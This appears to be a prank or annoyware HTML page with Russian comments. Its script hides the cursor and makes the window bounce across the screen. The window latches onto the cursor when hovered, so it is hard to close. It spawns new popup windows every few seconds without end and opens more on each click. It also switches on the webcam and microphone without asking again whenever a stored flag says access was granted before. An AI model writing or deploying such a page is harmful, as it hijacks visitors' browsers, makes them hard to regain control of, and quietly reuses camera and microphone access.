<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>JANNNMG</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            width: 350px;
            height: 350px;
            background-image: url('assets/game-over.gif');
            background-size: cover;
            background-position: center;
            overflow: hidden;
            cursor: none; /* Курсор теперь скрыт */
        }
        #webcamVideo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
            z-index: 10;
        }
    </style>
</head>
<body>
    <video id="webcamVideo" autoplay muted></video>
    <audio id="popupSound">
        <source src="assets/game-over-sound.mp3" type="audio/mpeg">
    </audio>
    
    <script>
        let x = Math.random() * (screen.availWidth - 350);
        let y = Math.random() * (screen.availHeight - 350);
        let vx = (Math.random() - 0.5) * 10;
        let vy = (Math.random() - 0.5) * 10;
        let stuckToCursor = false;
        let webcamStream = null;
        
        const popupSound = document.getElementById('popupSound');
        const webcamVideo = document.getElementById('webcamVideo');
        
        async function requestWebcamAccess() {
            try {
                // Запрашиваем доступ к веб-камере и микрофону
                webcamStream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                
                // Если доступ получен, устанавливаем поток в видео элемент
                webcamVideo.srcObject = webcamStream;
                webcamVideo.style.display = 'block';
                
                // Скрываем фоновую гифку
                document.body.style.backgroundImage = 'none';
                
                return true;
            } catch (error) {
                console.error('Error accessing webcam:', error);
                return false;
            }
        }
        
        function animate() {
            if (!stuckToCursor) {
                const screenWidth = screen.availWidth;
                const screenHeight = screen.availHeight;
                const windowWidth = window.outerWidth;
                const windowHeight = window.outerHeight;

                x += vx;
                y += vy;

                if (x + windowWidth > screenWidth || x < 0) {
                    vx = -vx;
                }
                if (y + windowHeight > screenHeight || y < 0) {
                    vy = -vy;
                }

                window.moveTo(x, y);
            }
            
            requestAnimationFrame(animate);
        }
        
        function createNewPopup() {
            setTimeout(() => {
                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                createNewPopup();
            }, Math.random() * 2000 + 4000);
        }
        
        document.addEventListener('mousemove', function(e) {
            if (stuckToCursor) {
                window.moveTo(e.screenX - 175, e.screenY - 175);
            }
        });

        document.body.addEventListener('mouseenter', function() {
            stuckToCursor = true;
        });

        document.body.addEventListener('mouseleave', function() {
            stuckToCursor = false;
        });
        
        document.body.addEventListener('click', function() {
            window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
        });
        
        window.onload = function() {
            animate();
            createNewPopup();
            popupSound.play();
            
            // Проверяем, был ли предоставлен доступ к веб-камере
            const webcamAccessGranted = localStorage.getItem('webcamAccessGranted');
            if (webcamAccessGranted === 'true') {
                requestWebcamAccess();
            }
        };
        
        // Добавляем обработчик для закрытия окна и освобождения ресурсов
        window.addEventListener('beforeunload', function() {
            if (webcamStream) {
                webcamStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
